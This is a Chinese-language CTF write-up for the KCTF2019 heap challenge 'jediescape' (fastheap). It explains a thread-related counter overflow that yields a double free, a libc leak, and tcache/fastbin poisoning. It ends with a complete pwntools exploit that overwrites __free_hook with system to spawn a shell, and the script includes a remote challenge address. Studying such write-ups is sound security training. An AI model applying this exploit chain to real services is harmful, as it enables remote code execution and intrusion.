---
title: 绝地逃生
categories:
- KCTF2019
---
# KCTF jediescape

## 前言

多线程的题，做题的时候漏洞没找到，记录一下

## 程序逻辑

程序有三个功能，分配，释放和输出。

![main](./1.jpg)

分配部分可以自己选择bss存储数组的index，size不能为0，之后输入数据

![malloc](./2.jpg)

Free部分读取的是一个范围start-end，释放的是start-end-1的chunk，这里start小于end且end不大于255，之后选择线程数量，通过start_routine函数进行释放

![free](./3.jpg)

![free2](./4.jpg)

start_routine函数里是一个循环，_InterlockedExchangeAdd8这个函数的功能是arg1指向的位置值+arg2，即*(end_index+8)+1。返回值为*(end_index+8)的初始值。看Free函数可以看到end_index2+8位置的v12是char类型，这意味着v12为255的时候，+1即变为0。

start_routine里每次执行这个函数，之后比较end_index和start_index，相等即退出，否则释放(bss数据不为空)

![start_routine](./5.jpg)

Puts函数在数组index处值不为空时输出

![puts](./6.jpg)

## 漏洞利用

这里利用的是start_routine的逻辑问题，我们取start为254，end为255，线程数为2。在第一个线程里，chunk_254被释放后变为255，执行函数，255+1变成了0，函数返回值为255，比较之后符合条件break。此时在第二个线程里*(end_index+8)的值为0，+1变为1，返回值为0，成功绕过了检查，相当于从0-254又释放了一遍，254的块double free。

在0位置处malloc一个0x90的堆，根据刚才的原理，0会被释放，之后放入unsorted bin，但是因为数据没有清空，可以Puts泄露Libc 

调试发现每个线程都有自己的thread_arena，即线程分配区。每次子线程结束的时候都会把tcache中的chunk放到对应大小的fastbin或者unsorted bin。这也导致我们不能用刚才那种最简单的方式(tcache加入fastbin的时候有重复检查，start可以选择253)

还有一个发现是malloc一个fastbin范围的内存时，如果tcache没有满，fastbin就会放入tcache中(晓晨师姐说之前0CTF还是LCTF有道类似的题,todo)，我们可以利用fast bin的double free修改其fd，再malloc的时候即可从tcache里分配到指定内存地址。

## exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 1
gadgets = [0x4f2c5,0x4f322,0x10a38c]

if debug:
    p = process('./fastheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc_offset = 0x3ebc40
else:
    p = remote('152.136.18.34',10000)
    libc = ELF('./libc-2.27.so')
    libc_offset = 0x3ebc40


def Malloc(index,size,content):
    p.recvuntil('>>> ')
    p.sendline('1')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(size))
    p.recvuntil('Contents: ')
    p.sendline(content)

def Free(start_index,end_index,workers):
    p.recvuntil('>>> ')
    p.sendline('2')
    p.recvuntil('Index range: ')
    p.sendline(str(start_index)+'-'+str(end_index))
    p.recvuntil('Number of workers: ')
    p.sendline(str(workers))

def Puts(index):
    p.recvuntil('>>> ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def Exit():
    p.recvuntil('>>> ')
    p.sendline('4')

def exp():
    Malloc(0,0x90,'0')

    for i in range(1,256):
        if i > 252:
            Malloc(i,0x60,str(i))
        else:
            Malloc(i,0x30,str(i))

    Free(253,255,2)#free 254 + [0,254]

    Puts(0)
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 96 - libc_offset
    log.success('libc base => ' + hex(libc_base)) 
    shell_addr = libc_base + libc.symbols['system']
    malloc_hook = libc_base + libc.symbols['__free_hook']
    fake_chunk = malloc_hook - 0x23
    log.success('malloc hook =>' + hex(malloc_hook))
    #get shell
    Malloc(253,0x60,p64(fake_chunk))
    Malloc(254,0x60,'1')
    Free(3,8,1)


    Malloc(3,0x60,'1')
    Malloc(4,0x60,'a'*0x23+p64(shell_addr))
    Malloc(5,0x10,'/bin/sh\x00')
    #trigger
    Free(5,6,1)
    


    p.interactive()
exp()

```

## 参考资料

[kctf_jackandkx](https://bbs.pediy.com/thread-252168.htm)
